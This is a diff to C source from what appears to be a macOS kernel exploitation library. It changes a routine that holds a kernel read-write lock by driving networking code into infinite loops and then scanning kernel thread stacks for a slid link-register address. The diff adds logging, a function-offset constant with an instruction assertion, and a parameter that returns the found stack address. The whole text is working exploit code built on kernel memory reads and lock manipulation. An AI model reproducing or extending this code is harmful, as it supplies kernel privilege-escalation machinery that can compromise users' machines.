@@ -23,11 +23,13 @@
 #include "util/misc.h"
 #include "util/ptrauth.h"
 #include "util/log.h"
+#include "util/asm.h"
 
 #include "macos_params.h"
 
 
 #define MAX_NECP_UUID_MAPPING_ID 128
+#define LR_LCK_RW_EXCLUSIVE_GEN_OFFSET 0xac
 
 
 struct xe_util_lck_rw {
@@ -223,10 +225,13 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     
     dispatch_semaphore_wait(sem_disconnect_start, DISPATCH_TIME_FOREVER);
     dispatch_release(sem_disconnect_start);
+    
+    xe_log_debug("waiting for lock owner to be set to locking thread");
     /// Wait for some time so that the lock will be acquired
     while (xe_kmem_read_ptr(lock, 8) != util->locking_thread) {
         xe_sleep_ms(10);
     }
+    xe_log_debug("lock owner is now set to locking thread");
     
     return util;
 }
@@ -237,7 +242,7 @@ uintptr_t xe_util_lck_rw_locking_thread(xe_util_lck_rw_t util) {
 }
 
 
-int xe_util_lck_rw_wait_for_contention(xe_util_lck_rw_t util, uintptr_t thread, uint64_t timeout_ms) {
+int xe_util_lck_rw_wait_for_contention(xe_util_lck_rw_t util, uintptr_t thread, uint64_t timeout_ms, uintptr_t* lr_stack_ptr) {
     uint64_t max_tries = timeout_ms == 0 ? UINT64_MAX : timeout_ms / 10;
     
     do {
@@ -247,7 +252,9 @@ int xe_util_lck_rw_wait_for_contention(xe_util_lck_rw_t util, uintptr_t thread, 
             continue;
         }
         
-        uintptr_t lr_exclusive_gen = xe_slider_kernel_slide(LR_LCK_RW_LOCK_EXCLUSIVE_EXCLUSIVE_GEN);
+        uintptr_t lr_exclusive_gen = xe_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_ADDR) + LR_LCK_RW_EXCLUSIVE_GEN_OFFSET;
+        xe_assert_cond(xe_kmem_read_uint32(lr_exclusive_gen - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_GEN_ADDR), lr_exclusive_gen - 4));
+        
         uintptr_t found_address;
         int error = xe_xnu_thread_scan_stack(thread, lr_exclusive_gen, XE_PTRAUTH_MASK, 512, &found_address);
         if (error == EBADF || error == ENOENT) {
@@ -258,6 +265,9 @@ int xe_util_lck_rw_wait_for_contention(xe_util_lck_rw_t util, uintptr_t thread, 
         
         uintptr_t lock = xe_kmem_read_ptr(found_address - 0x10 /* x19 */, 0);
         if (lock == util->target_lck_rw) {
+            if (lr_stack_ptr) {
+                *lr_stack_ptr = found_address;
+            }
             return 0;
         }
         
@@ -336,10 +346,12 @@ void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util_p) {
     /// Breaks the infinite loop in `nstat_pcb_cache`
     xe_util_lck_break_nstat_controls_cycle(util);
     
+    xe_log_debug("waiting for INP2_INHASHLIST flag to be set");
     /// Wait so that program reaches and stays at infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked`
     while (!(xe_kmem_read_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET) & 0x00000010)) {
         xe_sleep_ms(10);
     }
+    xe_log_debug("INP2_INHASHLIST flag is now set");
     
     /// Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to util->target_lck_rw so that correct lock
     /// will be unlocked when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
